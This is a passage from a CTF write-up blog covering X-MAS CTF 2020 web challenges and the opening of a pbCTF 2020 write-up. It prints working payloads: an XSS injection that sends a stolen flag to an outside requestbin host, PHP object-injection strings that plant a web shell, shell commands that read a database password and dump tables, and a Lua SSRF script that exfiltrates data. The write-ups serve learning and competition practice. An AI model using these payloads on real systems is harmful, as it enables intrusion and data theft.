X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}</p></blockquote><hr><h2 id="Web-Comfort-Bot-432-pts"><a href="#Web-Comfort-Bot-432-pts" class="headerlink" title=" (Web) Comfort Bot [432 pts]"></a><span style="color:#21C587"></span> (Web) Comfort Bot [432 pts]</h2><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.31.43.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot. </p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let’s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function. </p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.28.33.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><blockquote><p>FLAG : X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}</p></blockquote><hr><h2 id="Web-How-Brutus-stole-492-pts"><a href="#Web-How-Brutus-stole-492-pts" class="headerlink" title=" (Web) How Brutus stole [492 pts]"></a><span style="color:#21C587"></span> (Web) How Brutus stole [492 pts]</h2><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.41.24.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn’t have enough time to solve it. </p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I’m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.</p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didn’t work well. So I couldn’t solve the problem because of this. </p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;�pageContent�file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;�pageContent�newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.29.00.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, let’s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.40.25.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><blockquote><p>FLAG : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Let’s write Write Up only for web challenges solved by CTF.</p><hr><h2 id="Web-Sploosh-156-pts"><a href="#Web-Sploosh-156-pts" class="headerlink" title=" (Web) Sploosh [156 pts]"></a><span style="color:#21C587"></span> (Web) Sploosh [156 pts]</h2><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%2012.27.01.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.</p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.</p><p>Now I’ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Sploosh’s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%201.13.22.png?raw=true"></p><p>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.</p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : 